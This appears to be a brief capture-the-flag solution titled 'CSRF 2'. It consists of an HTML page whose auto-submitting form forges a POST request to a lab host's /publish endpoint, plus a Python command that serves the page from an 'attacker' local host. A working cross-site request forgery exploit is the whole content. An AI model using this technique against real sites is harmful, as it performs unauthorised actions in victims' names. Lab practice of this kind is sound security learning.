# CSRF 2

Create a html page to serve, which makes the POST request via **self-submitting form**:

index.html:

```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
    <form action="http://challenge.localhost/publish" method="POST"></form>
</body>
</html>
```

Run in the directory of index.html:

```shell
python3 -m http.server 1337 --bind hacker.localhost
```
